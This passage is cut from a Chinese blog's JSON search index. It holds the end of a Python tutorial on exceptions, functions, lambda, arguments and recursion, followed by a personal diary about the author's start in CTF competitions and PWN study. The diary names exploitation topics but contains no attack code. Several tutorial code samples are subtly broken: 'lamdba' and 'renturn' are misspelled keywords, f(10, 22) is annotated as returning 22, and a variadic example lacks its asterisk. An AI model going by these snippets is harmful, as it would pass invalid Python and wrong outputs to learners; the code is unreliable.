\u0026lt;语句块4\u0026gt;\n除了else语句与for、while循环的else以外，try和else也能擦除火花呢，else能当作try语句正常执行后的一种追加处理。finally语句块则不同，无论try语句块是否正常执行，finally都会照样执行，所以我们在编程中，finally语句块可以把一些交互代码的收尾工作内容放进去，比如输出”执行完毕“等等。\n如今的Python不像以前了，现在的它能识别多种异常类型，我不建议各位在编程让程序过度依赖try-except这样的异常处理机制，毕竟会影响可读性。try-except一般用于检测极少发生的情况、检测难以解决的报错，所以尽量用if语句来去判断，完全将所有可能出现的报错考虑进if-elif-else语句里，并给出解决措施的代码。\n对于商业软件产品，稳定性和可靠性和用户体验都是关键指标。它们不会滥用try-except语句的，因为会影响可读性以及弹出一些小报错给用户，影响用户体验，因此一般在关键地方才会采用try-except去处理可能出现的异常。\n第五章：函数和代码复用 函数的使用 函数的定义 函数是一段具有特定功能的、可重用的语句组，用函数名来表示并通过函数名进行功能调用。函数也可以看作是一段具有名字的子程序，可以在需要的地方调用执行，不需要在每个执行的地方重复编写这些语句。每次使用函数可以提供不同的参数作为输入，以实现对不同数据的处理：函数执行后，还可以反馈相应的处理一结果。\n函数能够完成特定功能，与黑盒类似，对函数的使用不需要了解函数内部实现原理，只要了解函数的输入输出方式即可。严格地说，函数是一种功能抽象。有些函数是用户自己编写的，称为自定义函数；Python安装包也自带了一些函数和方法，包括Python 内置的函数（如abs()、eval))、Python 标准库中的函数（如math 库中的 sqrt)）等。\n使用函数主要有两个目的：降低编程难度和代码重用。函数是一种功能抽象，利用它可以将一个复杂的大问题分解成一系列简单的小问题，然后将小问题继续划分成更小的问题，当问题细化到足够简单时，就可以分而治之，为每个小问题编写程序，并通过函数封装，当各个小问题都解决了，大问题也就迎刃而解。这是一种自顶向下的程序设计思想，函数可以在一个程序中的多个位置使用，也可以用于多个程序，当需要修改代码时，只需要在函数中修改一次，所有调用位置的功能都更新了，这种代码重用降低了代码行数和代码维护难度。\nPython 使用def保留字定义一个函数，语法形式如下：\ndef \u0026lt;函数名\u0026gt;(\u0026lt;参数列表\u0026gt;)\n​ \u0026lt;函数体\u0026gt;\n​ renturn \u0026lt;返回值列表\u0026gt;\n当函数体执行完return后，直接跳出该函数，如果该函数体的return下方还有其它语句的话是不执行的。这有点类似break语句。\n1 2 3 4 5 6 7 8 9 10 def happy(): print(\u0026#34;Happy birthday to you!\u0026#34;) def happyB (name): happy() happy() print(\u0026#34;Happy birthday, dear {}!\u0026#34;.format (name)) happy() happyB(\u0026#34;Mike\u0026#34;) print() happyB(\u0026#34;Lily\u0026#34;) Happy birthday to you!\nHappy birthday to you!\nHappy birthday, dear Mike!\n函数的调用过程 程序调用一个函数需要执行以下4个步骤。\n（1）调用程序在调用处暂停执行。\n（2）在调用时将实参复制给函数的形参。\n（3）执行函数体语句。\n（4）函数调用结束给出返回值，程序回到调用前的暂停处继续执行。\n刚刚上述的例子，其实形参被赋值为实参的值：name = \u0026ldquo;Mike\u0026rdquo;，然后将定义的函数happyB()里的name自动替换为\u0026quot;Mike\u0026rdquo;。\n类似在y = x + 1，x是形参，当x = 1时，1就是实参啦，然后最后调用这个函数得到的结果就是y = 2。\nlamdba函数 lambda作为保留字，用于定义一种特殊的函数匿名函数，又称lambda函数。匿名函数并非没有名字，而是将函数名作为函数结果返回，语法格式如下：\n\u0026lt;函数名\u0026gt; = lamdba \u0026lt;参数列表\u0026gt; : \u0026lt;表达式\u0026gt;\nlamdba函数与正常函数一样，等价于：\ndef \u0026lt;函数名\u0026gt;(\u0026lt;参数列表\u0026gt;):\n​ return \u0026lt;表达式\u0026gt;\n简单地说，lambda函数用于定义简单的、能够在一行内表示的函数，返回一个函数类型，实例如下：\n1 2 3 4 5 f = lamdba x, y : x + y type(f) #\u0026lt;class \u0026#39;function\u0026#39;\u0026gt; f(10, 22) #22 匿名函数在这里讲不清，放到后面的高阶函数一起讲会更好。\n函数的参数传递 要点：函数可以定义可选参数，使用参数的位置或名称传递参数值，根据函数中变量的不同作用域有不同的函数返回值方式。\n可选参数和可变数量参数 在定义函数时，如果有些参数存在默认值，即部分参数不一定需要调用程序输入，可以在定义函数时直接为这些参数指定默认值。当函数被调用时，如果没有传入对应的参数值，则使用函数定义时的默认值替代，例如：\n1 2 3 4 5 6 7 8 def dup(str, times = 2): print(str*times） dup(\u0026#34;knock~\u0026#34;) #knock~knock~ dup(\u0026#34;knock-\u0026#34;,4) #knock-knock-knock-knock~ 由于函数调用时需要按顺序输入参数，可选参数必须定义在非可选参数的后面，即dup)函数中带默认值的可选参数姝times必须定义在 str参数后面。\n在函数定义时，也可以设计可变数量参数，通过在参数前增加星号（*）实现。带有星号的可变参数只能出现在参数列表的最后。调用时，这些参数被当作元组类型传递到函数中，实例如下：\n1 2 3 4 5 6 7 8 9 def vfunc(a,b): print(type(b)) for n in b: a += n return a vfunc(1,2,3,4,5) #代码简化，这段代码不可运行，只是便于阅读而已，传入参数，a=1，b=2，3，4，5 #\u0026lt;class \u0026#39;tuple\u0026#39;\u0026gt; #15 参数的位置和名称传递 函数调用时，实参默认采用位置顺序的方式传递值给函数，例如上节的dup(\u0026ldquo;knock~\u0026quot;,4)中第一个实参默认赋值给形参str，第二个实参赋值给形参times。但如果你在程序编码中已经设定好了参数传递顺序，那就另当说。假设 func()函数有6个参数，它的定义如下，其中参数分别表示两组三维坐标值。\nfunc(x1,y1,z1,x2,y2,z2):\n​ return\n实际来说：\nresult = func(1,2,3,4,5,6)\n还看不懂？其实还能这样写传递参数：\nresult = func(x2=4, y2=5, z2=6, x1=1, y1=2,z1=3)\n顺序可以任意调整，参数对应就行。\n函数的返回值 上上节给的代码是不是还在琢磨为啥我给的代码到你这运行就是报错的呢？因为我给的代码是用来看的啊不是给你运行的，本身就不对的，我比较懒不想写全。\nreturn 语句用来退出函数并将程序返回到函数被调用的位置继续执行。return 语句可以同时将0个、1个或多个函数运算后的结果返回给函数被调用处的变量，例如：\n1 2 3 4 5 def func(a, b): return a*b s = func(\u0026#34;knock~\u0026#34;,2) print(s) #knock~knock~ 得有print才能输出值啊，不然运行多少次电脑都不输出的。这节确实有点水因为书上讲比较繁琐，其实比较简单的，在这里简化了，会用就行。\n函数的递归 递归的定义 函数作为一种代码封装，可以被其他程序调用，当然，也可以被函数内部代码调用。这种函数定义中调用函数自身的方式称为递归。就像一个人站在装满镜子的房间中，看到的影像就是递归的结果。递归在数学和计算机应用上非常强大，能够非常简洁地解决重要问题。\n按照自己的话说就是在调用函数时，内部又在调用函数本身，就函数里面有它自己，而里面的它的本身内部又有它自己\u0026hellip;\u0026hellip;。\n数学上有一个经典例子称为阶乘： $$ n! = n(n-1)(n-2)...(1) $$ 为了实现这个程序，可以通过一个简单的循环累积去计算阶乘。观察5!的计算，如果去掉了5,那么就剩下计算4!，推广来看，n! - n(n-1)!。实际上，这个关系给出了另一种表达阶乘的方式： $$ n! = \\begin{cases} 1 \u0026 n = 0 \\\\ n(n - 1)! \u0026 \\text{otherwise} \\end{cases} $$ 数学归纳法和递归都利用了递推原理，本质是相同的。\n递归的使用 先从阶乘开刀吧，根据用户输入的整数n，计算并输出n的阶乘值。\nfact()函数在其定义内部引用了自身，形成了递归过程（如第5行)。无限制的递归将耗尽计算资源，因此，需要设计基例使得递归逐层返回。fact()函数通过f语句给出了n为0时的基例，当n==0,fact()函数不再递归，返回数值1，如果n!=0,则通过递归返回n与n-1阶乘的乘积。\n","date":"2025-07-27T00:00:00Z","headings":[{"id":"前文","level":1,"text":"前文\n"},{"id":"目录","level":1,"text":"目录\n"},{"id":"直观例子","level":2,"text":"直观例子\n"},{"id":"正文语法","level":2,"text":"正文/语法\n"},{"id":"第一章程序设计基本方法","level":2,"text":"第一章：程序设计基本方法\n"},{"id":"第二章python程序实例解析","level":2,"text":"第二章：Python程序实例解析\n"},{"id":"第三章python语言的常规应用","level":2,"text":"第三章：Python语言的常规应用\n"},{"id":"第四章程序的控制结构","level":2,"text":"第四章：程序的控制结构\n"},{"id":"第五章函数和代码复用","level":2,"text":"第五章：函数和代码复用\n"},{"id":"c语言","level":3,"text":"C语言\n"},{"id":"python","level":3,"text":"Python\n"},{"id":"环境配置","level":3,"text":"环境配置\n"},{"id":"bug的由来","level":3,"text":"Bug的由来\n"},{"id":"快捷键","level":3,"text":"快捷键\n"},{"id":"计算机的概述","level":3,"text":"计算机的概述\n"},{"id":"程序设计语言","level":3,"text":"程序设计语言\n"},{"id":"python语言概述","level":3,"text":"Python语言概述\n"},{"id":"python语言开发环境配置","level":3,"text":"Python语言开发环境配置\n"},{"id":"程序基本编写","level":3,"text":"程序基本编写\n"},{"id":"python语言的迭代","level":3,"text":"Python语言的迭代\n"},{"id":"python语法规则","level":3,"text":"Python语法规则\n"},{"id":"python模块-库的引用","level":3,"text":"Python模块-库的引用\n"},{"id":"数字类型","level":3,"text":"数字类型\n"},{"id":"数字类型的操作","level":3,"text":"数字类型的操作\n"},{"id":"math库的使用","level":3,"text":"Math库的使用\n"},{"id":"字符串类型及其操作","level":3,"text":"字符串类型及其操作\n"},{"id":"字符串类型的格式化","level":3,"text":"字符串类型的格式化\n"},{"id":"程序的基本结构","level":3,"text":"程序的基本结构\n"},{"id":"程序的分支结构","level":3,"text":"程序的分支结构\n"},{"id":"程序的循环结构","level":3,"text":"程序的循环结构\n"},{"id":"random-库的使用","level":3,"text":"Random 库的使用\n"},{"id":"程序的异常处理","level":3,"text":"程序的异常处理\n"},{"id":"函数的使用","level":3,"text":"函数的使用\n"},{"id":"函数的参数传递","level":3,"text":"函数的参数传递\n"},{"id":"函数的递归","level":3,"text":"函数的递归\n"}],"image":"https://expl0rer.top/p/python/python_hu_5bd9977069b38398.png","permalink":"https://expl0rer.top/p/python/","title":"Python学习"},{"content":"[TOC]\n事先注明 这篇文章类似我的日记，仅是个人主观意见，如有影响可联系本人删改。谢谢！\n标题“从0-1”的“1”不可抵达，只是我的一个理想目标，我的“0”始于2024-09-04，这是我踏足网安行业的一个标志时间点。\n前传 我参加过很多比赛，不限于专业比赛，像互联网+，三创赛等，像专业比赛，比较典型的是UCSCctf、Actf、河南的御网杯、西电的XDCTF和他们那边的新生赛newstarsctf，虽然在初期更像是在当“混子”，其实也在给自己积累经验，，一开始我就是我通过学校的讲座来了解到有ctf这东西的，我看着挺有趣我就开始自学了，其实不然，这蕴含很多高深知识，这也是为什么很多网安岗位的加分项都有说“有CTF相关各类奖项的优先”的原因了，我第一次参加ctf线下赛是在大一下学期时候，广药举办的，如头图所示，当时组队参加，有黄某、凌某和范🐏，当时结束后也没混到奖，这实属是难啊，跟那些专职人员抢不过的。。。。（2025-08-xx）\n我的转折1 大一入门CTF，起手杂项，做了部分moectf2024题目去入门，说实话真坐牢，认识了几位西电的老铁，向他们请教电子取证这块的知识，抱上了自己学校的SAS网安俱乐部的学长的大腿😄，了解更多杂项知识，顺便学了点其他方向的CTF知识，当时被同学调侃称“样样都会，样样不精”。不过这确实是一个不好的地方，我的精力被分散了，打了中国国际大学生创新大赛、大小挑这些创赛，说实话有点水 \u0026hellip;。准备把我的老项目转手顺承给学弟学妹了。\n大一下准备结束的时候，SAS开始筛选人数，把原先我们大一的SAS队员筛选掉一部分，我因为自己职位太多（班长团支书+项目负责人+\u0026hellip;.）遗憾出局，在暑假末期我开始回归CTF，因为我的方向是MISC，所以学的东西特别杂：隐写、压缩包加密爆破、明文攻击、CRC32爆破、取证啥的，就感觉对我以后实习啥的针对性不是很强，我就在这时开始转方向了，问题是转什么方向？我当时想的是随大众转Web——能干渗透能参加护网行动能打渗透比赛也能搞老本行CTF和AWD，但是这么一想竞争会不会更大？对我的学习兴趣会不会衰减？会不会很难？\u0026hellip;.很多顾虑接踵而至，我尝试过各个方向，都有所了解，最终我决定搞PWN，听别人说PWN入门难精通难深入更难，我尝试做了几题PWN发现挺有趣的，有种莫名奇妙的打爆靶机的爽感，这让我继续坚定了这个方向，学到栈溢出开始难了，发昏的寄存器和gdb界面、老报错的exp\u0026hellip;各个搞我心态，真是唐的没边了\u0026hellip;.尽管刚入门一个多月，但每天的我都很充实。\n大二开学有幸选上了网管！（2025-10-03）\n志同道合的U 学网安的我，打ctf水了好多群：\n加了很多志同道友，交流CTF相关网安知识，还组队合伙打了个AWD😄比较招笑，当时是爆0，一题都不会，难崩\u0026hellip;\n最后结果我们队挨打在倒数。\n在这里鸣谢陪伴许久的Jason、世一喵斯、哥布林首领、群主卡奇。（2025-10-03）\n第一次出题！！ 在2025.10.10的中午时刻，WOW我在哥布林群吹水时我发现有个人发言说有偿当CTF出题人，我毫不犹豫加了他，生怕被抢了好机会，同意过后，我立刻把博客“甩”给了他，这就像是我的建立一样，充分地展示我的能力，我很得意哈，这是一位211大学的网安战队负责人，他同意了我去出题，在五天内出完6道题，紧接着我发现一个问题，我没出过题目，我只能上网现学，我害怕放了他的“鸽子”，即便在水课上我也丝毫不敢放松，拼命找教程，在CSDN上找到了GZctf开源平台去部署docker和设定dockerfile、出题的教程、程序编译等，最后万幸我也是完成了出题（在4天内，超前完成任务）！\n记下这一件事，我想说的是机会流逝极快，下一秒就会错过，我不断告诫自己一定要抓住好机会展示自己磨练自己。（2025.10.14）\n那次的S9强网杯 在10月这一周末，我迎来了第一次PWN的检验，加入了哥布林首领的GoblinSEC小队，10位大佬齐聚一堂，奋战36h，个人感觉比较辛苦，flag市场和bph给我的压力还是很大的，当然同PWN方向的师傅也很强的。我们只做出了这两道题，当然已经尽力了😄。（2025.10.21）\n当然也遇上了不好的风评，由于遇到种种困窘，不能及时回答而被质疑Py，也是因为现实中某种冲突使得我不能去一一解释清楚，我也无能为力，只能让这些质疑留给时间来回答吧。\n回归SAS 大学的网安俱乐部招新，可惜的是大二只招Web组的渗透、SRC、AI安全了，我是学二进制PWN的，经过部长的特许我被允许同新生参加二进制组的招新，当然面试发挥过程也是中规中矩，问道了栈溢出、ROP构造、Linux基本指令、FMT、堆入门等，基础不是很牢导致我有些卡壳，如泄露Libc这一块，反推基地址的过程描述有点乱（bushi，还是听得懂的，就有点口吃啥的）\n等同学招新完后和内部成员相约吃夜宵，和他们交谈得知PWN方向并不是很好学，虽说此前我也做好了准备，但得知面试我的学长最后也跳槽了Web，我不由自主的怀疑起了自己：自己真的能坚持到最后吗？我不想再转方向了，我的精力已经所剩无几，而且Web组方向的人很多竞争也大、市场行情不好，况且他们先前选择CTF方向—Web的时候已经有一部分基础了，所以他们学内网渗透、应急响应SRC等都会游刃有余，我的经历所剩无几，万一还转方向我会非常内耗，我现在已经19（大二）了，还在考虑是否本科就业和考研方向做出选择，算了\u0026hellip;\u0026hellip;我还是加油沉淀吧，先深入学PWN吧，毕竟二进制这口饭我是无论如何也要吃上的！！！！！！（2025.10.26）\n一个有干劲的学弟 直说吧，这一章是回忆录，本人没有任何倾向想去指明现实生活的人是谁，这只是一个小日记各位看看瓜就好\u0026hellip;\n那时我升到大二，在新生群吹水的时候，有聊到摄影的这一方面（我特别喜爱的），有个学弟加上了我问我怎么进这个社团，此可我们就开始认识了（2025.9.11）.\n这人很怪，怎么说，分享欲特别强，我们一开始聊得特别欢（我非常讨厌），他是那种自来熟的感觉，对我来说似乎是一种侵犯\u0026hellip;他隔三岔五给我发电东西，摄影胶卷、课堂照片啥的，好像是在给我报备的感觉😄（自认为，没有恶意），有一次我们学院的两个校级社团组织一场讲座，吸引同学报名，这位学弟就问我哪个能去，呃\u0026hellip;这我咋知道？得看你自己啊！！还问我关于这两个社团的一些问题，我都一一解释（好吧，有些是敷衍的，其实我也没进过，但耐不住他的热情，我也只能假戏真做）后来他跟我说想学CTF\u0026hellip;我跟他介绍了几个方向：misc、web、pwn、re、crypto等，但他说想跟我学同一个方向——PWN（哈哈当时我想笑又来一个当炮灰的人），随后我敷衍地说让他去做moectf2025的pwn题前三道（让他自生自灭😄）。结果发现他真是一块不折不扣的CTFer，很有潜力，他还把PWN的过程复现给我听（这是他第一次做WP，估计有些格式错误听得我难受，但可以理解）我觉得他很有毅力搞PWN，我索性把我的博客、我的付费课程都推给他，让他跟着去学，现在他也是能自学了，时不时来分享他对PWN的感受，我心想这人真是一块学PWN的料，不过我也在想带他学PWN是否正确，以后他会转Web吗？这不得而知，我已经仁义尽至了，带他入门了CTF，比其他人快了不知多少步\u0026hellip;\n希望他能继续走PWN这一条路（2025.9.26）\n","date":"2025-07-27T00:00:00Z","headings":[{"id":"事先注明","level":1,"text":"事先注明\n"},{"id":"前传","level":2,"text":"前传\n"},{"id":"我的转折1","level":2,"text":"我的转折1\n"},{"id":"志同道合的u","level":2,"text":"志同道合的U\n"},{"id":"第一次出题","level":2,"text":"第一次出题！！\n"},{"id":"那次的s9强网杯","level":2,"text":"那次的S9强网杯\n"},{"id":"回归sas","level":2,"text":"回归SAS\n"},{"id":"一个有干劲的学弟","level":2,"text":"一个有干劲的学弟\n"}],"image":"https://expl0rer.top/p/%E4%BB%8E0-1/%E6%88%91%E7%9A%84%E9%A6%96%E6%AC%A1%E7%BA%BF%E4%B8%8B%E8%B5%9B_hu_c31d988a763b701a.jpg","permalink":"https://expl0rer.top/p/%E4%BB%8E0-1/","title":"从0-1"}]